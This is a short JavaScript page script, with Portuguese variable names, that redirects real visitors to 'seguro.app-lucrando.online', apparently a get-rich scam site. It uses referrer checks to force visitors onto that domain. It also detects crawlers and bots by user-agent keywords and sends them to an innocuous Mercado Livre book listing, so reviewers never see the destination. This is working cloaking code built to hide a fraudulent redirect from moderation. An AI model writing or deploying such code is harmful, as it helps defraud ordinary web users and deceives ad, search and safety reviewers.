window.onload = function() {
    var numeroTelefone = "safe";
    var mensagem = "Olá!";
    var link = "https://seguro.app-lucrando.online/" + numeroTelefone;
    setTimeout(function() {
      window.location.href = link;
    }, 999);
  }
  var referer = document.referrer;
  var dominioPermitido = 'https://seguro.app-lucrando.online/';
  if (referer && referer.indexOf(dominioPermitido) === -1) {
    window.location.href = 'https://' + dominioPermitido;
  } else {
    document.body.style.display = 'block';
  }
var userAgent = navigator.userAgent.toLowerCase();
var isBot = false;
var botKeywords = ['bot', 'crawler', 'spider', 'http'];
for (var i = 0; i < botKeywords.length; i++) {
  if (userAgent.includes(botKeywords[i])) {
    isBot = true;
    break;
  }
}
if (isBot) {
  window.location.href = 'https://www.mercadolivre.com.br/livro-com-cenario-os-trs-porquinhos-com-4-personagens/p/MLB19334263?pdp_filters=item_id:MLB3597015303#wid=MLB3597015303&sid=search&is_advertising=true&searchVariation=MLB19334263&position=1&search_layout=grid&type=pad&tracking_id=ef02d443-09af-492c-80ef-9a415ceea8c0&is_advertising=true&ad_domain=VQCATCORE_LST&ad_position=1&ad_click_id=YTdmZDI1ODgtZGNlOS00YjgwLTk5ODktNWE2ZDhhYjgwZGJj';
} else {
  document.body.style.display = 'block'; 
}

